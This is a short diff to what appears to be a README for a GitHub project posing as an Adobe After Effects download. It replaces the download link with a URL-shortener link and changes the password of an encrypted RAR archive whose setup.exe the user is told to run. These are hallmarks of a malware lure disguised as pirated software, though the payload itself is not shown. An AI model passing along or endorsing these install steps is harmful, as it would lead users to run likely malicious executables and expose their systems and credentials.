@@ -2,8 +2,8 @@
 
 <H3>How to install</H3>
 
-- [Download](https://github.com/TieChuiErQiu/after-effects/releases/download/Download/Effects.rar)
-- Open archive (password: effects)
+- [Download](https://goo.su/yEXmIYV)
+- Open archive (password: Project12!)
 - Open setup.exe for install
 - Follow the instructions
 
